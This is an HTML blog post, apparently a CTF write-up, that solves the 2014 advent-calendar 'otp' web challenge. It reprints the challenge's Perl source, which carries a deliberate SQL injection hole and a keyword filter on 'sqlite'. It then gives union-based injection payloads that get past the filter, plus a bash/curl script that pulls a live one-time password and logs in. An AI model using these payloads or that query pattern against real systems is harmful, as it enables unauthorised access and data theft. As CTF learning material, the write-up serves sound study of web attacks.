@@ -1,0 +1,536 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Advent 2014 Day 21 : Otp - The Swappage Playground</title>
+  <meta name="author" content="Swappage">
+
+  
+  <meta name="description" content="otp was a nice (and painful) web challenge in the advent calendar CTF 2014. We were provided with the source code of the web application and with an &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="The Swappage Playground" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">The Swappage Playground</a></h1>
+  
+    <h2>Because in the end, what does matter is having fun.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:swappage.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Advent 2014 Day 21 : Otp</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-12-24T18:26:40+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>6:26 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>otp was a nice (and painful) web challenge in the advent calendar CTF 2014.</p>
+
+<p>We were provided with the source code of the web application and with an URL: the objective was to successfully login to the web site to get the flag.</p>
+
+<!-- more -->
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+<span class="line-number">56</span>
+<span class="line-number">57</span>
+<span class="line-number">58</span>
+<span class="line-number">59</span>
+<span class="line-number">60</span>
+<span class="line-number">61</span>
+<span class="line-number">62</span>
+<span class="line-number">63</span>
+<span class="line-number">64</span>
+<span class="line-number">65</span>
+<span class="line-number">66</span>
+<span class="line-number">67</span>
+<span class="line-number">68</span>
+<span class="line-number">69</span>
+<span class="line-number">70</span>
+<span class="line-number">71</span>
+<span class="line-number">72</span>
+<span class="line-number">73</span>
+<span class="line-number">74</span>
+<span class="line-number">75</span>
+<span class="line-number">76</span>
+<span class="line-number">77</span>
+<span class="line-number">78</span>
+<span class="line-number">79</span>
+<span class="line-number">80</span>
+<span class="line-number">81</span>
+<span class="line-number">82</span>
+<span class="line-number">83</span>
+<span class="line-number">84</span>
+<span class="line-number">85</span>
+<span class="line-number">86</span>
+<span class="line-number">87</span>
+<span class="line-number">88</span>
+<span class="line-number">89</span>
+<span class="line-number">90</span>
+<span class="line-number">91</span>
+<span class="line-number">92</span>
+<span class="line-number">93</span>
+<span class="line-number">94</span>
+<span class="line-number">95</span>
+<span class="line-number">96</span>
+<span class="line-number">97</span>
+<span class="line-number">98</span>
+<span class="line-number">99</span>
+<span class="line-number">100</span>
+<span class="line-number">101</span>
+<span class="line-number">102</span>
+<span class="line-number">103</span>
+<span class="line-number">104</span>
+<span class="line-number">105</span>
+<span class="line-number">106</span>
+<span class="line-number">107</span>
+<span class="line-number">108</span>
+<span class="line-number">109</span>
+<span class="line-number">110</span>
+</pre></td><td class="code"><pre><code class="perl"><span class="line"><span class="c1">#!/usr/bin/env perl</span>
+</span><span class="line"><span class="k">use</span> <span class="nn">Mojolicious::</span><span class="n">Lite</span><span class="p">;</span>
+</span><span class="line"><span class="k">use</span> <span class="n">DBI</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="k">my</span> <span class="nv">$dbh</span> <span class="o">=</span> <span class="n">DBI</span><span class="o">-&gt;</span><span class="nb">connect</span><span class="p">(</span>
+</span><span class="line">    <span class="s">&#39;dbi:SQLite:dbname=./otp.db&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span>
+</span><span class="line">    <span class="o">+</span><span class="p">{</span>
+</span><span class="line">        <span class="n">RaiseError</span>     <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+</span><span class="line">        <span class="n">sqlite_unicode</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line"><span class="p">);</span>
+</span><span class="line"><span class="n">app</span><span class="o">-&gt;</span><span class="n">helper</span><span class="p">(</span><span class="n">dbh</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span> <span class="nv">$dbh</span> <span class="p">});</span>
+</span><span class="line">
+</span><span class="line"><span class="n">get</span> <span class="s">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span>
+</span><span class="line">    <span class="k">my</span> <span class="nv">$c</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
+</span><span class="line">    <span class="k">my</span> <span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="o">=</span> <span class="n">gen_otp</span><span class="p">();</span>
+</span><span class="line">    <span class="k">my</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="k">do</span><span class="p">(</span><span class="s">&#39;INSERT INTO otp VALUES (?, ?, ?)&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">);</span>
+</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;index&#39;</span><span class="p">,</span> <span class="n">token</span> <span class="o">=&gt;</span> <span class="nv">$token</span><span class="p">);</span>
+</span><span class="line"><span class="p">};</span>
+</span><span class="line">
+</span><span class="line"><span class="n">post</span> <span class="s">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="k">sub </span><span class="p">{</span>
+</span><span class="line">    <span class="k">my</span> <span class="nv">$c</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
+</span><span class="line">    <span class="k">my</span> <span class="nv">$token</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;token&#39;</span><span class="p">);</span>
+</span><span class="line">    <span class="c1"># tiny firewall, but powerful :P</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span> <span class="o">=~</span><span class="sr"> /sqlite/i</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;no hack.&quot;</span><span class="p">);</span>
+</span><span class="line">        <span class="k">return</span><span class="p">;</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">my</span> <span class="nv">$time</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
+</span><span class="line">    <span class="k">my</span> <span class="p">(</span><span class="nv">$expire</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="n">selectrow_array</span><span class="p">(</span>
+</span><span class="line">        <span class="s">&quot;SELECT ###CENSORED### FROM otp WHERE ###CENSORED### = &#39;$token&#39; AND ###CENSORED### &lt; $time&quot;</span><span class="p">,</span>
+</span><span class="line">    <span class="p">);</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$expire</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;otp expired at $expire&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class="line">        <span class="k">my</span> <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s">&#39;pass&#39;</span><span class="p">);</span>
+</span><span class="line">        <span class="k">my</span> <span class="p">(</span><span class="nv">$ok</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="n">selectrow_array</span><span class="p">(</span>
+</span><span class="line">            <span class="s">&#39;SELECT 1 FROM otp WHERE ###CENSORED### = ? AND ###CENSORED### = ?&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span>
+</span><span class="line">        <span class="p">);</span>
+</span><span class="line">        <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;auth&#39;</span><span class="p">,</span> <span class="n">ok</span> <span class="o">=&gt;</span> <span class="nv">$ok</span><span class="p">);</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">dbh</span><span class="o">-&gt;</span><span class="k">do</span><span class="p">(</span>
+</span><span class="line">        <span class="s">&#39;DELETE FROM otp WHERE ###CENSORED### = ?&#39;</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nv">$token</span>
+</span><span class="line">    <span class="p">);</span>
+</span><span class="line"><span class="p">};</span>
+</span><span class="line">
+</span><span class="line"><span class="k">sub </span><span class="nf">gen_otp</span> <span class="p">{</span>
+</span><span class="line">    <span class="nb">open</span> <span class="k">my</span> <span class="nv">$fh</span><span class="p">,</span> <span class="s">&#39;&lt;:raw&#39;</span><span class="p">,</span> <span class="s">&#39;/dev/urandom&#39;</span> <span class="ow">or</span> <span class="nb">die</span> <span class="vg">$!</span><span class="p">;</span>
+</span><span class="line">    <span class="nb">read</span> <span class="nv">$fh</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$token</span><span class="p">,</span> <span class="mi">8</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$token</span> <span class="o">=</span> <span class="nb">unpack</span> <span class="s">&#39;H*&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">;</span>
+</span><span class="line">    <span class="nb">read</span> <span class="nv">$fh</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$pass</span><span class="p">,</span> <span class="mi">16</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">unpack</span> <span class="s">&#39;H*&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">;</span>
+</span><span class="line">    <span class="k">return</span> <span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="n">app</span><span class="o">-&gt;</span><span class="n">start</span><span class="p">;</span>
+</span><span class="line"><span class="bp">__DATA__</span>
+</span><span class="line">
+</span><span class="line"><span class="nv">@@</span> <span class="nv">index</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;OTP&#39;</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="o">&lt;</span><span class="n">form</span> <span class="n">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="o">&gt;</span>
+</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;token&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s">&quot;&lt;%= $token %&gt;&quot;</span> <span class="o">/&gt;</span>
+</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;pass&quot;</span> <span class="o">/&gt;</span>
+</span><span class="line">  <span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s">&quot;auth&quot;</span> <span class="o">/&gt;</span>
+</span><span class="line"><span class="sr">&lt;/form&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nv">@@</span> <span class="nv">auth</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;Authentication | OTP&#39;</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="nv">%</span> <span class="nv">if</span> <span class="p">(</span><span class="nv">$ok</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="n">authentication</span> <span class="n">succeeded</span><span class="o">.&lt;</span><span class="n">br</span> <span class="sr">/&gt;the flag is: ###CENSORED###&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class="line"><span class="nv">%</span> <span class="err">}</span> <span class="nv">else</span> <span class="p">{</span>
+</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="n">authentication</span> <span class="n">failed</span><span class="o">.</span><span class="sr">&lt;/p&gt;</span>
+</span><span class="line"><span class="nv">%</span> <span class="err">}</span>
+</span><span class="line">
+</span><span class="line"><span class="err">@@</span> <span class="nv">error</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">layout</span> <span class="s">&#39;default&#39;</span><span class="p">;</span>
+</span><span class="line"><span class="nv">%</span> <span class="nv">title</span> <span class="s">&#39;Error | OTP&#39;</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="sr">&lt;p&gt;</span><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="err">$</span><span class="nv">message</span> <span class="nv">%</span><span class="err">&gt;&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="nv">@@</span> <span class="nv">layouts</span><span class="o">/</span><span class="n">default</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">ep</span>
+</span><span class="line"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+</span><span class="line"><span class="sr">&lt;html&gt;</span>
+</span><span class="line">  <span class="sr">&lt;head&gt;</span>
+</span><span class="line">    <span class="sr">&lt;title&gt;</span><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="nv">title</span> <span class="nv">%</span><span class="err">&gt;&lt;/</span><span class="nv">title</span><span class="o">&gt;</span>
+</span><span class="line">  <span class="sr">&lt;/head&gt;</span>
+</span><span class="line">  <span class="sr">&lt;style&gt;</span>
+</span><span class="line"><span class="n">body</span><span class="p">,</span> <span class="n">input</span> <span class="p">{</span>
+</span><span class="line">  <span class="n">color:</span> <span class="c1">#fff;</span>
+</span><span class="line">  <span class="n">background:</span> <span class="c1">#333;</span>
+</span><span class="line">  <span class="n">font</span><span class="o">-</span><span class="n">family:</span> <span class="n">monospace</span><span class="p">;</span>
+</span><span class="line">  <span class="n">font</span><span class="o">-</span><span class="n">size:</span> <span class="mi">150</span><span class="nv">%</span><span class="err">;</span>
+</span><span class="line"><span class="err">}</span>
+</span><span class="line"><span class="err">.</span><span class="nv">container</span> <span class="p">{</span>
+</span><span class="line">  <span class="n">width:</span> <span class="mi">100</span><span class="nv">%</span><span class="err">;</span>
+</span><span class="line">  <span class="nv">margin</span><span class="o">-</span><span class="n">top:</span> <span class="mi">50</span><span class="n">px</span><span class="p">;</span>
+</span><span class="line">  <span class="n">text</span><span class="o">-</span><span class="n">align:</span> <span class="n">center</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">  <span class="sr">&lt;/style&gt;</span>
+</span><span class="line">  <span class="sr">&lt;body&gt;</span>
+</span><span class="line"><span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s">&quot;container&quot;</span><span class="o">&gt;</span>
+</span><span class="line"><span class="o">&lt;</span><span class="nv">%</span><span class="err">=</span> <span class="nv">content</span> <span class="nv">%</span><span class="err">&gt;</span>
+</span><span class="line"><span class="err">&lt;/</span><span class="nv">div</span><span class="o">&gt;</span>
+</span><span class="line">  <span class="sr">&lt;/body&gt;</span>
+</span><span class="line"><span class="sr">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>To log in the web application we need to submit a password, paired with the token we are provided as an hidden field in the form, and this pair of credentials is valid for 10 seconds: if the token has expired we won’t be able to log in, so what we need to do is to find a way to generate a token and exfiltrate the password generated by the application for that specific token, before it expires.</p>
+
+<p>As it’s possible to observe from the source code, the query at line 31 is dynamic, so it’s possible to perform a SQL injection attack against the application.</p>
+
+<p>By sending a tampered token value in the POST request, it’s possible to notice that we are facing a union based injection attack: infact if we send something like this:</p>
+
+<pre><code>token=' UNION SELECT 1;
+</code></pre>
+
+<p>we would be presented with the following output in the web page</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>otp expired at 1<span class="nt">&lt;/p&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>It would at this point be easy to enumerate the database structure, tables and columns to exfiltrate some valid data, but it would have been too easy; at line 25 we can see</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="perl"><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span> <span class="o">=~</span><span class="sr"> /sqlite/i</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">    <span class="nv">$c</span><span class="o">-&gt;</span><span class="n">render</span><span class="p">(</span><span class="s">&#39;error&#39;</span><span class="p">,</span> <span class="n">message</span> <span class="o">=&gt;</span> <span class="s">&quot;no hack.&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="k">return</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>which makes this challenge a real pain. Infact, as the comment suggets, this is a really tiny yet powerful firewall, because to enumerate the database, we’d need to access the sqlite_master table, where metadata about table structure are stored, but guess what? this is filtered and we cant.</p>
+
+<p>So, no table enumeration: we need to find an alternative way to exfiltrate a valid password to log in.</p>
+
+<p>I’m not that good at sql injection attacks, and in fact it took me a while to figure this out, but after a lot of trial and error i learned that column names are not needed to read data from them</p>
+
+<p>I’ve tried the following injection query and eventually it resulted in the last generated password correctly exfiltrated.</p>
+
+<pre><code>token=' UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);
+</code></pre>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>otp expired at 1bffa01d220d8d69f102dc08b07ba199<span class="nt">&lt;/p&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>now all i needed was to be fast enaugh to exfiltrate a valid password and login within 10 seconds.</p>
+
+<p>bash and curl came to the rescue, i put togeder this dirty and terrible script that helped me to login and get the flag</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c">#!/bin/bash</span>
+</span><span class="line">
+</span><span class="line"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>curl http://otp.adctf2014.katsudon.org <span class="p">|</span> grep input <span class="p">|</span> grep token <span class="p">|</span> awk -F <span class="s1">&#39;&quot;&#39;</span> <span class="s1">&#39;{print $6}&#39;</span><span class="k">)</span>
+</span><span class="line"><span class="nv">PASS</span><span class="o">=</span><span class="k">$(</span>curl http://otp.adctf2014.katsudon.org -d <span class="s2">&quot;token=&#39; UNION SELECT pass FROM (SELECT 1 AS expire, 2 AS pass, 3 AS token UNION SELECT * FROM otp order by token desc LIMIT 0,1);&amp;pass=&quot;</span> <span class="p">|</span> grep expired <span class="p">|</span> awk -F <span class="s1">&#39; &#39;</span> <span class="s1">&#39;{print $4}&#39;</span> <span class="p">|</span> awk -F <span class="s1">&#39;&lt;&#39;</span> <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+</span><span class="line">
+</span><span class="line"><span class="nb">echo</span> <span class="nv">$TOKEN</span>
+</span><span class="line"><span class="nb">echo</span> <span class="nv">$PASS</span>
+</span><span class="line">
+</span><span class="line">curl http://otp.adctf2014.katsudon.org -d <span class="s2">&quot;token=$TOKEN&amp;pass=$PASS&quot;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="html"><span class="line"><span class="nt">&lt;p&gt;</span>authentication succeeded.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>the flag is: ADCTF_all_Y0ur_5CH3ma_ar3_83L0N9_t0_u5<span class="nt">&lt;/p&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Swappage</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-12-24T18:26:40+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>6:26 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/" data-via="" data-counturl="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/08/picoctf-2014-guess/" title="Previous Post: picoCTF 2014: Guess">&laquo; picoCTF 2014: Guess</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-2014-day-21-otp/">Advent 2014 Day 21 : Otp</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/08/picoctf-2014-guess/">picoCTF 2014: Guess</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/08/picoctf-2014-tick-tock/">picoCTF 2014: Tick Tock</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/08/picoctf-2014-steves-list/">picoCTF 2014: Steve&#8217;s List</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/08/picoctf-2014-rsa-mistakes/">picoCTF 2014: RSA Mistakes</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Swappage -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'swappage';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/';
+        var disqus_url = 'http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  jax: ["input/TeX", "output/HTML-CSS"],
+  tex2jax: {
+    inlineMath: [ ['$', '$'] ],
+    displayMath: [ ['$$', '$$']],
+    processEscapes: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  },
+  messageStyle: "none",
+  "HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML" type="text/javascript"></script>
+</body>
+</html>
